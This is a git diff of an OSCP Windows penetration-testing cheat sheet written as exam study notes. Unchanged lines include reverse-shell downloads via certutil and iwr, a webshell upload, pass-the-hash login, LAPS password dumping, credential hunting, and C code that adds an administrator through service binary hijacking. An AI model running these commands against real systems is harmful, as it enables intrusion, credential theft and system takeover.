@@ -1,19 +1,16 @@
 ---
-title: Cheat Sheet - OSCP Windows
+title: OSCP - Cheat Sheet - Windows
 created: 2024-06-10
-updated: 2025-10-30
+updated: 2026-06-30
 status: reference
 draft: false
 tags:
   - cyber-security
   - oscp
 Related:
+  - "[[OSCP]]"
 ---
-Related:
-Tags: [OSCP]({{< relref "posts/oscp.md" >}})
-
----
-## Quick Reference
+# Quick Reference
 - `dir /s/b local.txt` - Usually `C:\` or `C:\users\username\desktop\`
 - `dir /s/b proof.txt` - Usually `C:\Users\Administrator\Desktop\`
 - `dir /s/b *.txt`
@@ -24,7 +21,7 @@ Tags: [OSCP]({{< relref "posts/oscp.md" >}})
 - Transfer to Windows host: `certutil -split -urlcache -f http://192.168.x.x/revshell.exe C:\\Users\\username\\revshell.exe`
 - Fix Broken Path: `set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;`
 - Windows Exploit Suggester: [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
-## Port Enumeration (from Kali)
+# Port Enumeration (from Kali)
 - **HTTP/WebDav (80)**: `cadaver 192.168.`
 	- Run `put /usr/share/webshells/aspx/cmdasp.aspx` to upload command shell, then access via browser
 - **Kerberos (88)**: `kerbrute userenum -d domain.name --dc 192.168. users`
@@ -37,10 +34,10 @@ Tags: [OSCP]({{< relref "posts/oscp.md" >}})
 	- Domain Name found (LDAP Search): `ldapsearch -v -x -b 'DC=domain,DC=name' -H 'ldap://192.168.' '(objectclass=*)'`
 	- Use credentials to find admin password `ldapsearch -x -H 'ldap://192.168.x.x' -D 'domain\user' -w 'userpassword' -b 'dc=domain,dc=name' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd`
 		- To Login `psexec.py domain.name/administrator: 'adminpassword'@192.168.x.x` to login
-## Impacket 
+# Impacket 
 Psexec.py - `/usr/share/doc/python3-impacket/examples/psexec.py`
 `impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.xx.xxx`
-## PrivEsc (From Windows)
+# PrivEsc (From Windows)
 [HackTricks - Windows PrivEsc Checklist](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)
 - Group memberships of the current user: `whoami /groups`
 	- Existing groups: `net localgroup` or `Get-LocalGroup`	
@@ -68,7 +65,7 @@ S-1-5-11                      Authenticated Users
 S-1-5-18                      Local System
 S-1-5-domainidentifier-500    Administrator
 ```
-### Find Credentials
+## Find Credentials
 Try each of these steps ***for each user you get access to***
 - Cleartext files: `Get-ChildItem -Path C:\Users\username -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`
 - Powershell history: `get-history` or `(Get-PSReadlineOption).HistorySavePath`
@@ -77,7 +74,7 @@ Try each of these steps ***for each user you get access to***
 	- `keepass2john Database.kdbx > keepass.hash` 
 	- Remove `Database` from start of `keepass.hash` then `john keepass.hash`
 - XAMPP: `Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
-### Evil-WinRM - Creates Powershell Remoting Session
+## Evil-WinRM - Creates Powershell Remoting Session
 - Login: `evil-winrm -i 192.168.xx.xxx -u user -p "password\$\!"` (escape special characters: `"password$!"` = `"password\$\!"`)
 ## Using Scheduled Tasks
 - Find scheduled tasks: `schtasks /query /fo LIST /v` 
@@ -86,7 +83,7 @@ Try each of these steps ***for each user you get access to***
 	- Move original to safe space: `move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak`
 	- Pull `adduser.exe` in with iwr: `iwr -uri http://192.168.xx.xxx/adduser.exe -outfile C:\target\path\scheduledtask.exe`
 - `C:\Users\moss\Searches\VoiceActivation.exe`
-### Services
+## Services
 - Find running processes: `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
 - Start Process monitor and filter for target process 
 	- Use `restart-servce servicename` if nothing is listed
@@ -130,7 +127,7 @@ LPVOID lpReserved ) // Reserved
 	- Keep an eye out for services NOT installed in `System32`
 - Check permissions for target binary; `Powershell: icacls "C:\xampp\apache\bin\httpd.exe"
 	- Look for `BUILTIN\Users:(F)` (Full Access for standard users)
-### Permissions for Icacls
+## Permissions for Icacls
 - Replace original binary with a new one written in C (`adduser.c`) that will create a new administrator (`dave2:password123!`)
 ```
 #include <stdlib.h>
@@ -151,7 +148,7 @@ int main ()
 - Move & Rename new binary into it's place: `move .\adduser.exe C:\xampp\apache\bin\httpd.exe`
 - Restart the running service: `net stop httpd` then `net start httpd`
 - `C:\BackupMonitor\BackupMonitor.exe`
-### Service Control Privilege
+## Service Control Privilege
 If user does not have service control privilege: 
 - See if service has `Auto` StartMode: `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'httpd'}
 - If user has `SeShutdownPrivilege` (check `whoami /priv`) then reboot: `shutdown /r /t 0`
@@ -219,7 +216,7 @@ C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
 	- eg. `icacls "C:\"` then `icacls "C:\Program Files` then `C:\Program Files\Enterprise Apps`
 	- If the `Enterprise Apps` folder is writeable, then rename `adduser.exe` to the partial path; eg. `Current.exe` for `C:\Program Files\Enterprise Apps\Current.exe`
 	- Start or restart the service to execute the malicious binary in the path
-### Privileges
+## Privileges
 - Check if user has admin access: `Find-LocalAdminAccess` (can take several mins)
 - Check system for logged in users: `Get-NetSession -ComputerName files04 -Verbose`
 	- Windows has updated since `v10.0 (16299)` (aka build 1709) to block `Net-Session`
